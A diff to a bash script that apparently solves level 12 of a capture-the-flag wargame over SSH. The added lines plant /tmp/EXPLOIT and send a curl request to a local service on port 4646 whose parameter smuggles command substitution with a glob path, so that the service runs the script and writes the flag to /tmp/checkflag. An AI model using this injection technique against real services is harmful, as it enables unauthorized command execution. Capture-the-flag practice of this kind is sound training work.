@@ -113,12 +113,13 @@ main() {
     flag12_password="";
 
     init_ssh_socket "$level12_socket_path" "$host" "$port" "$level12_username" "$level12_password";
-    ssh_exec_via_socket "$level12_socket_path" "$host" "$port" "$level12_username" "echo 'Hello World !'";
+    ssh_exec_via_socket "$level12_socket_path" "$host" "$port" "$level12_username" "echo 'getflag > /tmp/checkflag' > /tmp/EXPLOIT && chmod +x /tmp/EXPLOIT";
+    checkflag=$(ssh_exec_via_socket "$level12_socket_path" "$host" "$port" "$level12_username" "curl localhost:4646?x='$(/*/EXPLOIT)'; cat /tmp/checkflag" | head -n 1 | awk  '{print $NF}');
     close_ssh_socket "$level12_socket_path" "$host" "$port" "$level12_username";
 
-    # flag_outpath="$CURR_DIR_PATH/../flag";
-    # echo "Checkflag: $checkflag";
-    # echo -n "$checkflag" > "$flag_outpath";
+    flag_outpath="$CURR_DIR_PATH/../flag";
+    echo "Checkflag: $checkflag";
+    echo -n "$checkflag" > "$flag_outpath";
 }
 
 main "$@";
